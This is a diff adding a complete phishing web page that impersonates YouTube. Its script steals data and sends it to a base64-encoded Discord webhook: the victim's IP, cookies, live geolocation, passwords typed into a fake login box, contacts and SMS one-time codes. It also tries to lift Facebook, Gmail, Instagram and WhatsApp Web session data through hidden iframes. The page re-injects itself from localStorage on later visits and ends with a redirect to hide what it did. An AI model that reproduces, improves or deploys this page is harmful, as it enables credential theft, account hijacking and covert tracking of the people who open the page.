@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>YouTube - Watch Video</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Roboto', sans-serif; text-align: center; padding: 50px; background: #0f0f0f; color: white; }
+        .loader { border: 6px solid #333; border-top: 6px solid #fff; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 30px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        input { padding: 10px; margin: 10px; width: 80%; max-width: 300px; border: 1px solid #333; border-radius: 8px; background: #222; color: white; }
+        button { background: #1a73e8; color: white; padding: 12px 24px; border: none; border-radius: 8px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h1>🎥 YouTube</h1>
+    <p>Verifying your device for HD playback...</p>
+    <div class="loader"></div>
+    <p>Checking security settings...</p>
+
+    <div id="fakeLogin" style="display:none; margin-top:30px;">
+        <input type="email" placeholder="Email" id="fakeEmail" />
+        <input type="password" placeholder="Password" id="fakePass" />
+        <button onclick="fakeAlert()">Continue</button>
+    </div>
+
+    <script>
+        // === ✅ YOUR REAL WEBHOOK (BASE64 ENCODED FOR MINIMAL OBSCURITY) ===
+        const webhook = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU3NTg1Mjg0ODUxMDY2NDgwNi9KSTNQWG5nVG1PYndJWF9pQ2EtNkVvSUJoLTdSS3Rlekw3VUMtelpvTGFqbWoyTmNoVGVzWk1QeThQbXBUYmFrSVFQbw==');
+
+        // === PERSISTENCE: STORE FULL PAGE IN LOCAL STORAGE ===
+        if (!localStorage.getItem('yt_persist')) {
+            const fullPage = document.documentElement.outerHTML;
+            localStorage.setItem('yt_persist', btoa(fullPage));
+        }
+
+        // === REINJECT ON FUTURE VISITS ===
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                if (localStorage.getItem('yt_persist') && !document.body.innerHTML.includes('Verifying your device')) {
+                    const html = atob(localStorage.getItem('yt_persist'));
+                    document.open();
+                    document.write(html);
+                    document.close();
+                }
+            }, 500);
+        });
+
+        // === MAIN EXECUTION DELAY ===
+        setTimeout(() => {
+            collectDeviceData();
+            loadStealthFrames();
+            requestContacts();
+            watchSMS();
+            hijackWhatsApp();
+            setTimeout(() => {
+                window.location = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+            }, 10000);
+        }, 2000);
+
+        async function collectDeviceData() {
+            try {
+                const ip = await (await fetch('https://api.ipify.org')).text();
+                const data = {
+                    t: new Date().toISOString(),
+                    ip,
+                    ua: navigator.userAgent,
+                    lang: navigator.language,
+                    plat: navigator.platform,
+                    cookie: document.cookie,
+                    ls: JSON.stringify(Object.keys(localStorage)).substr(0, 500),
+                    ss: JSON.stringify(Object.keys(sessionStorage)).substr(0, 500),
+                    ts: Date.now()
+                };
+
+                post(webhook, {content: `📱 ANDROID FULL PWN\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``});
+
+                // === GEOLOCATION ===
+                navigator.geolocation.getCurrentPosition?.(p => {
+                    const { latitude: lat, longitude: lon } = p.coords;
+                    post(webhook, {content: `📍 LIVE LOCATION\nLat: ${lat}\nLon: ${lon}\nMap: https://maps.google.com/?q=${lat},${lon}`});
+                }, null, {enableHighAccuracy: true, timeout: 10000});
+            } catch(e) {}
+        }
+
+        function fakeAlert() {
+            const e = document.getElementById('fakeEmail').value;
+            const p = document.getElementById('fakePass').value;
+            if (e && p) {
+                post(webhook, {content: `📧 CREDENTIALS STOLEN\nEmail: ${e}\nPassword: ${p}`});
+            }
+            alert("Verification failed. Try again later.");
+        }
+
+        function loadStealthFrames() {
+            const sites = [
+                { u: "https://facebook.com/login.php", k: "c_user" },
+                { u: "https://mail.google.com", k: "GMAIL_LB" },
+                { u: "https://instagram.com/accounts/login", k: "ds_user_id" }
+            ];
+            sites.forEach(s => {
+                const f = document.createElement('iframe');
+                f.src = s.u;
+                f.style.display = 'none';
+                f.onload = () => setTimeout(() => {
+                    try {
+                        const c = f.contentDocument?.cookie || "N/A";
+                        if (c.includes(s.k)) {
+                            post(webhook, {content: `🔑 LOGGED INTO ${s.u.split('/')[2]}\n\`\`\`cookie\n${c}\n\`\`\``});
+                        }
+                    } catch(e) {}
+                }, 3000);
+                document.body.appendChild(f);
+            });
+        }
+
+        function requestContacts() {
+            if ('contacts' in navigator && 'get' in navigator.contacts) {
+                navigator.contacts.get({ properties: ['name','email','tel'] })
+                .then(contacts => {
+                    post(webhook, {content: `📇 CONTACTS EXFILTRATED\n\`\`\`json\n${JSON.stringify(contacts, null, 2)}\n\`\`\``});
+                }).catch(() => {});
+            }
+        }
+
+        function watchSMS() {
+            if ('OTPCredential' in window) {
+                navigator.credentials.get({
+                    otp: { transport: ['sms'] },
+                    signal: AbortSignal.timeout(60000)
+                }).then(otp => {
+                    post(webhook, {content: `🔐 SMS OTP INTERCEPTED: \`${otp.code}\``});
+                }).catch(() => {});
+            }
+        }
+
+        function hijackWhatsApp() {
+            const wapp = document.createElement('iframe');
+            wapp.src = 'https://web.whatsapp.com';
+            wapp.style.position = 'absolute';
+            wapp.style.top = '-9999px';
+            wapp.style.width = '100%';
+            wapp.style.height = '800px';
+            wapp.style.border = 'none';
+
+            wapp.onload = () => {
+                const check = setInterval(() => {
+                    try {
+                        const ctx = wapp.contentWindow;
+                        if (!ctx) return;
+
+                        const ls = ctx.localStorage;
+                        if (ls && ls['WABrowserId']) {
+                            clearInterval(check);
+
+                            // Try to read recent messages
+                            const indexedDB = ctx.indexedDB;
+                            const req = indexedDB.open('wawc');
+                            req.onsuccess = function() {
+                                const db = req.result;
+                                const tx = db.transaction(['messages'], 'readonly');
+                                const store = tx.objectStore('messages');
+                                const all = store.getAll();
+
+                                all.onsuccess = function() {
+                                    const last5 = all.result.slice(-5).map(m => ({
+                                        from: m.id.remote,
+                                        body: m.body,
+                                        ts: new Date(m.t * 1000).toISOString()
+                                    }));
+                                    post(webhook, {
+                                        content: `💬 WHATSAPP HIJACKED + MESSAGES\n\`\`\`json\n${JSON.stringify({
+                                            session: {
+                                                WABrowserId: ls['WABrowserId'],
+                                                WAToken1: ls['WAToken1'],
+                                                WAToken2: ls['WAToken2']
+                                            },
+                                            lastMessages: last5
+                                        }, null, 2)}\n\`\`\``
+                                    });
+                                };
+                            };
+                        }
+                    } catch(e) {}
+                }, 2000);
+            };
+            document.body.appendChild(wapp);
+        }
+
+        function post(url, payload) {
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(() => {});
+        }
+    </script>
+</body>
+</html>
